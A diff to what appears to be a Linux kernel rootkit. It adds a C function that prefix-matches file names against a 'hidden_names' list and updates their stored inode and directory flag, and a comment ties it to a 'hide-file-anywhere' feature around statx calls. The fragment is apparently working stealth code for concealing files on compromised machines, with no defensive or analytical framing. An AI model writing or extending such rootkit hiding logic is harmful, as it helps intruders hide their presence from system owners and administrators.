@@ -177,6 +177,35 @@ bool fs_search_name(const char *name, u64 ino) {
     return false;
 }
 
+/**
+ * find the name match, and update
+ * inode, type, if necessary
+ * this can be useful for "hide-file-anywhere" when the next
+ * call is statx, making data available upwards
+ */
+bool fs_search_and_update(const char *name, u64 ino, bool is_dir) {
+    bool rc = false;
+    struct hidden_names *node, *node_safe;
+    list_for_each_entry_safe(node, node_safe, &names_node, list) {
+
+        /** This will match any string starting with pattern */
+        if (!strncmp(node->name, name, strlen(node->name))) {
+            rc = true;
+
+            if (node->is_dir != is_dir) {
+                prinfo("Update[is_dir] name='%s' ino=%llu is_dir=%d\n", name, ino, is_dir);
+                node->is_dir = is_dir;
+            }
+            if (node->ino != ino) {
+                prinfo("Update[ino] name='%s' ino=%llu is_dir=%d\n", name, ino, is_dir);
+                node->ino = ino;
+            }
+            break;
+        }
+    }
+    return rc;
+}
+
 void fs_list_names(void) {
     struct hidden_names *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
